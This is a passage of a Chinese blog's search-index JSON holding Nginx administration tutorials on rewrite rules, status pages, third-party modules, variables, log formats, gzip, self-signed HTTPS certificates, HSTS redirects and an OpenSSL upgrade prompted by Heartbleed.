#要求: www.magedu.com/images/20200106/1.jpg =\u003e www.magedu.com/index.do?name=images\u0026dir=20200106=\u0026file=1.jpg #规则配置: if ($host ~* (.*)\\.magedu\\.com) { rewrite ^/(.*)/(\\d+)/(.*)$ /index.do?name=$1\u0026dir=$2\u0026file=$3 last; } ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:11:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":["Nginx"],"content":"Nginx 高级配置及第三方模块 Nginx 状态页 基于nginx 模块 ngx_http_stub_status_module 实现，在编译安装nginx的时候需要添加编译参数 –with-http_stub_status_module 注意：状态页显示的是整个服务器的状态，而非虚拟主机的状态 配置示例 [root@centos7 conf.d]# nginx -V #查看nginx编译参数，确定添加了ngx_http_stub_status_module模块 nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 conf.d]# pwd /apps/nginx/conf.d [root@centos7 conf.d]# cat pc.conf #编辑虚拟主机，添加状态页配置 server { listen 80 default_server; server_name pc.test.org; location /nginx_status { #状态页uri匹配规则 stub_status; } } ##访问测试 [root@centos7 conf.d]# curl pc.test.org/nginx_status/ Active connections: 1 server accepts handled requests 11 11 15 #分别对应accepts,handled,requests三个字段 Reading: 0 Writing: 1 Waiting: 0 ##参数解释 Active connections： #当前处于活动状态的客户端连接数（=reading+writing+waiting） accepts：#统计总值，Nginx自启动后已经接受的客户端请求连接的总数。 handled：#统计总值，Nginx自启动后已经处理完成的客户端请求连接总数，通常等于accepts，除非有因为worker_connections限制等被拒绝的连接 requests：#统计总值，Nginx自启动后客户端发来的总的请求数（单次连接可能发生多次请求）。 Reading：#当前状态，正在读取客户端请求报文首部的连接的连接数,数值越大,说明排队现象严重,性能不足 Writing：#当前状态，正在向客户端发送响应报文过程中的连接数,数值越大,说明访问量很大 Waiting：#当前状态，正在等待客户端发出请求的空闲连接数，开启 keep-alive的情况下,这个值等于active – (reading+writing) Nginx 第三方模块 第三方模块是对nginx 的功能扩展，第三方模块需要在编译安装nginx的时候使用参数–add-module=PATH指定路径添加，有的模块是由公司的开发人员针对业务需求定制开发的，有的模块是开源爱好者开发好之后上传到github进行开源的模块，nginx的第三方模块需要从源码重新编译进行支持 比如:开源的echo模块 https:/github.com/openresty/echo-nginx-module 示例：添加第三方模块 echo-nginx-module #配置虚拟主机使用echo-nginx-module模块 [root@centos7 conf.d]# cat pc.conf server { listen 80 default_server; server_name pc.test.org; location /main { index index.html; default_type text/html; echo \"hello world--\u003e\"; echo $remote_addr; echo_reset_timer; #将计时器开始时间重置为当前时间 echo_location /sub1; echo_location /sub2; echo \"took $echo_time_elapsed sed for total.\"; } } location /sub1 { echo_sleep 1; echo sub1; } location /sub2 { echo_sleep 1; echo sub2; } #语法检查报错 [root@centos7 conf.d]# nginx -t nginx: [emerg] unknown directive \"echo\" in /apps/nginx/conf.d/pc.conf:8 #不支持echo模块 nginx: configuration file /apps/nginx/conf/nginx.conf test failed #查看当前nginx并未添加echo-nginx-module模块 [root@centos7 conf.d]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module ###下载echo-nginx-mudule模块，重新编译nginx并添加此模块 [root@centos7 src]# nginx -s stop #停止老版本nginx [root@centos7 conf.d]# cd /usr/local/src [root@centos7 src]# git clone https:/github.com/openresty/echo-nginx-module.git [root@centos7 nginx-1.18.0]# ./configure \\ --prefix=/apps/nginx \\ --user=nginx --group=nginx \\ --with-http_ssl_module \\ --with-http_v2_module \\ --with-http_realip_module \\ --with-http_stub_status_module \\ --with-http_gzip_static_module \\ --with-pcre \\ --with-stream \\ --with-stream_ssl_module \\ --with-stream_realip_module \\ --with-http_perl_module \\ --add-module=/usr/local/src/echo-nginx-module #指定模块源代码路径 [root@centos7 src]# make \u0026\u0026 make install root@centos7 nginx-1.18.0]# /apps/nginx/sbin/nginx -t #语法检查通过 nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 nginx-1.18.0]# /apps/nginx/sbin/nginx -V #查看编译后的新版本 nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:0:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"内置变量 官方文档 http:/nginx.org/en/docs/varindex.html 常用内置变量 $remote_addr; #存放了客户端的地址，注意是客户端的公网IP $proxy_add_x_forwarded_for #此变量表示将客户端IP追加请求报文中X-Forwarded-For首部字段,多个IP之间用逗号分隔,如果请求中没有X-Forwarded-For, 就使用$remote_addr the “X-Forwarded-For” client request header field with the $remote_addr variable appended to it, separated by a comma. If the “X-Forwarded-For” field is not present in the client request header, the $proxy_add_x_forwarded_for variable is equal to the $remote_addr variable. $args; #存放了URL中的所有参数，例如:对于http:/www.magedu.org/main/index.do?id=20190221\u0026partner=search $args的值就是：id=20190221\u0026partner=search $document_root; #保存了针对当前资源的请求的系统根目录,例如:/apps/nginx/html。 $document_uri; #保存了当前请求中不包含参数的URI，注意是不包含请求的指令，比如:http:/www.magedu.org/main/index.do?id=20190221\u0026partner=search会被定义为/main/index.do #$document_uri的值为:/main/index.do $host; #存放了请求的host名称 $limit_rate; #如果nginx服务器使用limit_rate配置了显示网络速率，则会显示，如果没有设置， 则显示0 $remote_port; #客户端请求Nginx服务器时随机打开的端口，这是每个客户端自己的端口 $remote_user; #已经经过Auth Basic Module验证的用户名 $request_body_file; #做反向代理时发给后端服务器的本地资源的名称 $request_method; #请求资源的方式，GET/PUT/DELETE等 $request_filename; #当前请求的资源文件的磁盘路径，由root或alias指令与URI请求生成的文件绝对路径，如:/apps/nginx/html/main/index.html $request_uri; #包含请求参数的原始URI，不包含主机名，相当于:$document_uri?$args,例如：/main/index.do?id=20190221\u0026partner=search $scheme; #请求的协议，例如:http，https,ftp等 $server_protocol; #保存了客户端请求资源使用的协议的版本，例如:HTTP/1.0，HTTP/1.1，HTTP/2.0等 $server_addr; #保存了服务器的IP地址 $server_name; #请求的服务器的主机名 $server_port; #请求的服务器的端口号 $http_user_agent; #客户端浏览器的详细信息 $http_cookie; #客户端的所有cookie信息 $cookie_\u003cname\u003e #cookie中某个字段值，name为任意请求报文首部字部cookie的key $http_\u003cname\u003e #name为任意请求报文首部字段,表示记录请求报文的首部字段，name的对应的首部字段名需要为小写，如果有横线需要替换为下划线。 #示例: echo $http_user_agent; echo $http_host; $sent_http_\u003cname\u003e #name为响应报文的首部字段，name的对应的首部字段名需要为小写，如果有横线需要替换为下划线,此变量有问题 #示例： echo $sent_http_server; $arg_\u003cname\u003e #此变量存放了URL中的指定参数，name为请求url中指定的参数名 #示例 echo $arg_id; 范例： ##站点配置 [root@centos7 ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80 default_server; server_name pc.test.org; location /main { index index.html; default_type text/html; echo $remote_addr; echo $args; echo $document_root; echo $document_uri; echo $host; echo $http_user_agent; echo $http_cookie; echo $request_filename; echo $scheme; echo $scheme:/$host$document_uri?$args; } } ##返回结果 [root@centos7 ~]# curl -b title=test 'http:/pc.test.org/main/index.do?id=2022\u0026partner=search' 172.16.16.88 id=2022\u0026partner=search /apps/nginx/html /main/index.do pc.test.org curl/7.29.0 title=test /apps/nginx/html/main/index.do http http:/pc.test.org/main/index.do?id=2022\u0026partner=search 范例： ##站点配置 [root@centos7 ~]# cat /apps/nginx/conf.d/www.conf server { listen 80; server_name www.test.com; location /echo { echo $request; echo $proxy_add_x_forwarded_for; echo $args; echo $document_uri; echo $request_uri; echo $document_root; echo $host; echo $request_method; echo $request_filename; echo $scheme; set $test $http_host; #自定义变量，将$http_host的值赋给test变量 echo $test; echo $http_User_Agent; echo $http_cookie; echo $cookie_key1; } } ##访问测试 [root@centos7 ~]# curl -b 'key1=v1;key2=v2' \"http:/www.test.com/echo/index.html?id=666\u0026partner=search\" GET /echo/index.html?id=666\u0026partner=search HTTP/1.1 172.16.16.88 id=666\u0026partner=search /echo/index.html /echo/index.html?id=666\u0026partner=search /apps/nginx/html www.test.com GET /apps/nginx/html/echo/index.html http www.test.com curl/7.29.0 key1=v1;key2=v2 v1 ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:1:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"自定义变量 语法格式： Syntax: set $variable value; Default: — Context: server, location, if 范例： ##站点配置 [root@centos7 ~]# cat /apps/nginx/conf.d/www.conf server { listen 80; server_name www.test.com; location /echo { set $name test; echo $name; set $my_port $server_port; echo $my_port; echo \"server_name:$server_port\"; } } ##访问测试 [root@centos7 ~]# curl www.test.com/echo GET /echo HTTP/1.1 172.16.16.88 /echo /echo /apps/nginx/html www.test.com GET /apps/nginx/html/echo http www.test.com curl/7.29.0 Nginx 自定义访问日志 访问日志是记录客户端即用户的具体请求内容信息，而在全局配置模块中的error_log是记录nginx服务器运行时的日志保存路径和日志的level，两者是不同的，而且Nginx的错误日志一般只有一个，但是访问日志可以在不同的server中定义多个。定义访问日志使用access_log指令指定日志保存路径，使用log_format指定日志的格式，格式中定义要保存的具体的日志内容。 访问日志由 ngx_http_log_module 模块实现 官方帮助文档：http:/nginx.org/en/docs/http/ngx_http_log_module.html 语法格式： Syntax: access_log path [format [buffer=size] [gzip[=level]] [flush=time] [if=condition]]; access_log off; Default: access_log logs/access.log combined; Context: http, server, location, if in location, limit_except ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:2:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"自定义日志默认格式 如果要保留日志的源格式，只需添加相应的日志内容，配置如下： http { ... log_format my_nginx_format '$remote_addr - $remote_user [$time_local] \"$request\"' '$status $body_bytes_sent \"$http_referer\"' '\"$http_user_agent\" \"$http_x_forwarded_for\"' '$server_name:$server_port'; access_log logs/access.log my_nginx_format; ... } #注意：此指令一定要放在log_format命令后（nginx配置从上至下依次生效） access_log logs/access.log my_nginx_format; ##重启nginx访问测试 [root@centos7 nginx]# tail -3 logs/access.log 172.16.16.88 - - [02/Aug/2022:23:51:26 +0800] \"GET /echo HTTP/1.1\" 200 211 \"-\" \"curl/7.29.0\" #默认日志格式 172.16.16.88 - - [04/Aug/2022:19:08:42 +0800] \"GET / HTTP/1.1\"200 6 \"-\"\"curl/7.29.0\" \"-\"pc.test.org:80 #自定义日志格式my_nginx_format ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:3:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"自定义json格式日志 nginx的默认日志格式记录的内容相对单一，且默认的格式也不方便后期做日志统计分析，生产环境中通常将nginx日志格式为json格式，然后配合ELK做日志收集、统计和分析。 配置示例： http { ... log_format json_log '{\"@timestamp\":\"$time_iso8601\",' '\"clientip\":\"$remote_addr\",' '\"size\":$body_bytes_sent,' '\"responsetime\":$request_time,' '\"upstreamtime\":\"$upstream_response_time\",' '\"upstreamhost\":\"$upstream_addr\",' '\"http_host\":\"$host\",' '\"uri\":\"$uri\",' '\"xff\":\"$http_x_forwarded_for\",' '\"referer\":\"$http_referer\",' '\"tcp_xff\":\"$proxy_protocol_addr\",' '\"http_user_agent\":\"$http_user_agent\",' '\"status\":\"$status\"}'; access_log logs/access.log json_log; ... } ##重启nginx，查看生成的日志格式 [root@centos7 nginx]# tail -1 logs/access.log {\"@timestamp\":\"2022-08-04T19:27:18+08:00\",\"clientip\":\"127.0.0.1\",\"size\":6,\"responsetime\":0.000,\"upstreamtime\":\"-\",\"upstreamhost\":\"-\",\"http_host\":\"localhost\",\"uri\":\"/index.html\",\"xff\":\"-\",\"referer\":\"-\",\"tcp_xff\":\"-\",\"http_user_agent\":\"curl/7.29.0\",\"status\":\"200\" Nginx 压缩功能 Nginx支持对指定类型的文件进行压缩然后再传输给客户端，而且压缩还可以设置压缩比例，压缩后的 文件大小将比源文件显著变小，这样有助于降低出口带宽的利用率，降低企业的IT支出，不过会占用相 应的CPU资源。 Nginx对文件的压缩功能是依赖于模块 ngx_http_gzip_module,默认是内置模块 官方文档：https:/nginx.org/en/docs/http/ngx_http_gzip_module.html 格式： Syntax: gzip on | off; Default: gzip off; Context: http, server, location, if in location 相关指令： #启用或禁用gzip压缩，默认关闭 gzip on | off; #压缩比由低到高从1到9，默认为1 gzip_comp_level level; #禁用IE6 gzip功能 gzip_disable \"MSIE [1-6]\\.\"; #gzip压缩的最小文件，小于设置值的文件将不会压缩 gzip_min_length 1k; #启用压缩功能时，协议的最小版本，默认HTTP/1.1 gzip_http_version 1.0 | 1.1; #指定Nginx服务需要向服务器申请的缓存空间的个数和大小,平台不同,默认:32 4k或者16 8k; gzip_buffers number size; #指明仅对哪些类型的资源执行压缩操作;默认为gzip_types text/html，不用显示指定，否则出错 gzip_types mime-type ...; #如果启用压缩，是否在响应报文首部插入“Vary: Accept-Encoding”,一般建议打开 gzip_vary on | off; #预压缩，即直接从磁盘找到对应文件的gz后缀的式的压缩文件返回给用户，无需消耗服务器CPU #注意: 来自于ngx_http_gzip_static_module模块 gzip_static on | off; 示例： ##分别生成5Bytes 大小的index.html文件以及2k大小的2k.text [root@centos7 ~]# echo test \u003e /apps/nginx/html/pc/index.html [root@centos7 ~]# dd if=/dev/zero of=/apps/nginx/html/pc/2k.text bs=2k count=1 1+0 records in 1+0 records out 2048 bytes (2.0 kB) copied, 0.000405459 s, 5.1 MB/s [root@centos7 ~]# ll /apps/nginx/html/pc/2k.text -h -rw-r--r-- 1 root root 2.0K Aug 4 20:01 /apps/nginx/html/pc/2k.text [root@centos7 ~]# ll /apps/nginx/html/pc/index.html -h -rw-r--r-- 1 nginx nginx 5 Aug 4 19:43 /apps/nginx/html/pc/index.html #准备站点配置 [root@centos7 ~]# cat /apps/nginx/conf.d/pc.conf server { listen 80 default_server; server_name pc.test.org; gzip on; gzip_comp_level 5; gzip_min_length 1k; #小于1k的文件不压缩 gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/gif image/png; gzip_vary on; location / { index index.html; default_type text/html; root html/pc; } } [root@centos7 ~]# nginx -s reload [root@centos7 ~]# curl -I --compressed pc.test.org/index.html HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 04 Aug 2022 12:02:22 GMT Content-Type: text/html Content-Length: 5 #index.html文件未压缩，仍是5Bytes Last-Modified: Thu, 04 Aug 2022 11:43:47 GMT Connection: keep-alive Keep-Alive: timeout=60 ETag: \"62ebb0f3-5\" Accept-Ranges: bytes [root@centos7 ~]# curl -I --compressed pc.test.org/2k.txt HTTP/1.1 404 Not Found Server: nginx/1.18.0 Date: Thu, 04 Aug 2022 12:02:34 GMT Content-Type: text/html Content-Length: 153 #2k.txt被压缩为153Bytes Connection: keep-alive Keep-Alive: timeout=60 Nginx 配置https ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:4:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"https 相关参数 nginx 的https 功能基于模块ngx_http_ssl_module实现，作为nginx的核心功能，yum安装的nginx默认就是开启的，编译安装的nginx需要指定编译参数–with-http_ssl_module开启。 官方文档：https:/nginx.org/en/docs/http/ngx_http_ssl_module.html 相关指令： #为指定的虚拟主机配置是否启用ssl功能，此功能在1.15.0废弃，使用listen [ssl]替代 ssl on | off; listen 443 ssl; #指向包含当前虚拟主机和CA的两个证书信息的文件，一般是crt文件 ssl_certificate /path/to/file; #当前虚拟主机使用的私钥文件，一般是key文件 ssl_certificate_key /path/to/file; #支持ssl协议版本，早期为ssl现在是TLS，默认为后三个 #配置ssl缓存 ssl_session_cache off | none | [builtin[:size]] [shared:name:size]; off： #关闭缓存 none: #通知客户端支持ssl session cache，但实际不支持 builtin[:size]：#使用OpenSSL内建缓存，为每worker进程私有 [shared:name:size]：#在各worker之间使用一个共享的缓存，需要定义一个缓存名称和缓存空间大小，一兆可以存储4000个会话信息，多个虚拟主机可以使用相同的缓存名称 #客户端连接可以复用ssl session cache中缓存的有效时长，默认5m ssl_session_timeout time; ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:5:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"自签名证书 生成自签名证书 ##进入nginx安装目录，新建存放证书的目录 [root@centos7 ~]# cd /apps/nginx/ [root@centos7 nginx]# mkdir certs [root@centos7 nginx]# cd certs/ ##生成自签名CA证书ca.crt和私钥ca.key [root@centos7 certs]# openssl req -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 3650 -out ca.crt Generating a 4096 bit RSA private key ...........................................................................................++ ................................................................................................................................................................................++ writing new private key to 'ca.key' ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. ----- Country Name (2 letter code) [XX]:cn State or Province Name (full name) []:sichuan Locality Name (eg, city) [Default City]:chengdu Organization Name (eg, company) [Default Company Ltd]:nginx Organizational Unit Name (eg, section) []:nginx.com Common Name (eg, your name or your server's hostname) []:www.nginx.com Email Address []:22@qq.com [root@centos7 certs]# ls ca.crt ca.key ##生成网站私钥www.nginx.com.key和证书请求www.nginx.com.csr [root@centos7 certs]# openssl req -newkey rsa:4096 -nodes -sha256 -keyout www.nginx.com.key -out www.nginx.com.csr Generating a 4096 bit RSA private key .......++ ...................................................................................++ writing new private key to 'www.nginx.com.key' ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. ----- Country Name (2 letter code) [XX]:cn #国家 State or Province Name (full name) []:sichuan #省份 Locality Name (eg, city) [Default City]:chengdu #城市 Organization Name (eg, company) [Default Company Ltd]:nginx #公司 Organizational Unit Name (eg, section) []:nginx.com #部门 Common Name (eg, your name or your server's hostname) []:www.nginx.com #通用名 Email Address []:511670559@qq.com #邮箱 Please enter the following 'extra' attributes to be sent with your certificate request A challenge password []: An optional company name []: [root@centos7 certs]# ls www* www.nginx.com.csr www.nginx.com.key www.nginx.crt ##使用ca签发网站的证书www.nginx.crt [root@centos7 certs]# openssl x509 -req -days 3650 -in www.nginx.com.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out www.nginx.com.crt Signature ok subject=/C=cn/ST=sichuan/L=chengdu/O=nginx/OU=nginx.com/CN=www.nginx.com/emailAddress=511670559@qq.com Getting CA Private Key [root@centos7 certs]# ls ca.crt ca.key ca.srl www.nginx.com.crt www.nginx.com.csr www.nginx.com.key ##查看证书内容 [root@centos7 certs]# openssl x509 -in www.nginx.com.crt -noout -text Certificate: Data: Version: 1 (0x0) Serial Number: f5:49:30:f5:10:2f:4b:ea Signature Algorithm: sha256WithRSAEncryption Issuer: C=cn, ST=sichuan, L=chengdu, O=nginx, OU=nginx.com, CN=www.nginx.com/emailAddress=22@qq.com Validity Not Before: Aug 4 14:48:57 2022 GMT Not After : Aug 1 14:48:57 2032 GMT Subject: C=cn, ST=sichuan, L=chengdu, O=nginx, OU=nginx.com, CN=www.nginx.com/emailAddress=511670559@qq.com Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (4096 bit) ... ## 将ca证书和网站证书输出到一个文件（注意前后次序） [root@centos7 certs]# cat www.nginx.com.crt ca.crt \u003e www.nginx.com.pem ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:6:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"https 配置 ##准备站点配置文件 [root@centos7 certs]# cat /apps/nginx/conf.d/pc.conf server { listen 80; listen 443 ssl; server_name pc.test.org; location / { index index.html; default_type text/html; root html/pc; } ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; } ##重启nginx [root@centos7 certs]# nginx -t nginx: the configuration file /apps/nginx/conf/nginx.conf syntax is ok nginx: configuration file /apps/nginx/conf/nginx.conf test is successful [root@centos7 certs]# nginx -s reload 浏览器访问测试，由于是自签名证书，浏览器并不信任 ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:7:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"实现多域名 https Nginx 支持基于单个IP实现多域名的功能，并且还支持单IP多域名的基础之上实现HTTPS，其实是基于Nginx的 SNI（Server Name Indication）功能实现，SNI是为了解决一个Nginx服务器内使用一个IP绑定多个域名和证书的功能。其实现流程是客户端在连接到服务器建立SSL链接之前先发送要访问站点的域名（Hostname），这样服务器再根据这个域名返回给客户端一个合适的证书。 简单来说，SNI实现了为多个虚拟主机配置各自的https认证功能，配置方式和上一节内容类似，这里不做演示。 查看nginx支持SNI功能： [root@centos7 nginx]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled #支持SNI功能 configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module ","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:8:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"实现 HSTS 官方文档：https:/www.nginx.com/blog/http-strict-transport-security-hsts-and-nginx/ 未配置http跳转的情况时： 实例： # 站点配置 [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; server_name pc.test.org; location / { index index.html; default_type text/html; root html/; } } #http访问成功 [root@centos7 conf.d]# curl www.test.org default #https请求报错 [root@centos7 conf.d]# curl www.test.org:443 \u003chtml\u003e \u003chead\u003e\u003ctitle\u003e400 The plain HTTP request was sent to HTTPS port\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003ccenter\u003e\u003ch1\u003e400 Bad Request\u003c/h1\u003e\u003c/center\u003e \u003ccenter\u003eThe plain HTTP request was sent to HTTPS port\u003c/center\u003e \u003chr\u003e\u003ccenter\u003enginx/1.18.0\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e 配置rewrite实现http跳转https后： 范例： ##站点配置 [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; server_name pc.test.org; add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always; #开启客户端缓存功能，当发起http请求时优先访问缓存，直接进行本地http跳转 location / { index index.html; default_type text/html; root html/; #配置http跳转https if ( $scheme = http ) { rewrite ^/(.*)$ https:/www.test.org/$1 redirect; } } } #发起http请求，返回响应码为302 [root@centos7 conf.d]# curl pc.test.org \u003chtml\u003e \u003chead\u003e\u003ctitle\u003e302 Found\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003ccenter\u003e\u003ch1\u003e302 Found\u003c/h1\u003e\u003c/center\u003e \u003chr\u003e\u003ccenter\u003enginx/1.18.0\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e [root@centos7 conf.d]# curl pc.test.org -L #跟踪302重定向后又报证书校验错误 curl: (60) Peer's certificate issuer has been marked as not trusted by the user. More details here: http:/curl.haxx.se/docs/sslcerts.html curl performs SSL certificate verification by default, using a \"bundle\" of Certificate Authority (CA) public keys (CA certs). If the default bundle file isn't adequate, you can specify an alternate file using the --cacert option. If this HTTPS server uses a certificate signed by a CA represented in the bundle, the certificate verification probably failed due to a problem with the certificate (it might be expired, or the name might not match the domain name in the URL). If you'd like to turn off curl's verification of the certificate, use the -k (or --insecure) option. # 发起http请求，自动跳转https成功 [root@centos7 conf.d]# curl pc.test.org -kL #跟随重定向并忽略证书安全性检查，请求成功 default 关于 favicon.io favicon.ico 文件是网站标签页的小图标，当客户端使用浏览器问页面时，浏览器会自己主动发起请求获取页面的favicon.ico文件，但是当浏览器请求的favicon.ico文件不存在时，服务器会记录404日志，而且浏览器也会显示404报错 图标位置： 报错如下： [root@centos7 nginx]# tail -1 logs/error.log # 日志中的报错 2022/08/05 17:47:54 [error] 2604#0: *200 open() \"/apps/nginx/html/favicon.ico\" failed (2: No such file or directory), client: 172.16.16.1, server: pc.test.org, request: \"GET /favicon.ico HTTP/1.1\", host: \"pc.test.org\", referrer: \"http:/pc.test.org/\" [root@centos7 nginx]# ls /apps/nginx/html/favicon.ico # 文件确实不存在 ls: cannot access /apps/nginx/html/favicon.ico: No such file or directory 解决方案： #将自己的图标命令为favicon.ico放置于指定目录下 [root@centos7 html]# wget https:/gitee.com/favicon.ico -P /apps/nginx/html/ [root@centos7 html]# ll /apps/nginx/html/favicon.ico -rw-r--r-- 1 root root 41566 Jun 10 11:59 /apps/nginx/html/favicon.ico 访问测试（浏览器按快捷键 CTRL+F5 强制刷新） OpenSSL版本升级 OpenSSL程序库当前广泛用于实现互联网的传输层安全（TLS）协议。心脏出血（Heartbleed），也简 称为心血漏洞，是一个出现在加密程序库OpenSSL的安全漏洞，此漏洞于2012年被引入了软件中， 2014年4月首次向公众披露。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可 能因此而受到攻击。此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检 查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多。 范例：升级OpenSSL解决安全漏洞 [root@centos7 ~]# nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 #当前OpenSSL版本 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip","date":"2022-08-02","objectID":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/:9:0","tags":["nginx"],"title":"Nginx高级配置","uri":"/posts/nginx/nginx%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"主要介绍Nginx核心配置文件 配置文件说明 nginx 官方文档：http://nginx.org/en/docs/ ","date":"2022-07-25","objectID":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/:0:0","tags":["Nginx"],"title":"Nginx核心配置","uri":"/posts/nginx/nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"},{"categories":["Nginx"],"content":"nginx 配置文件组成： 主配置文件： nginx.conf 子配置文件： conf.d/*.conf fastcgi,， uwsgi，scgi 等协议的相关配置文件 mime.types：支持的mime类型，MIME（Multipurpose Internet Mail 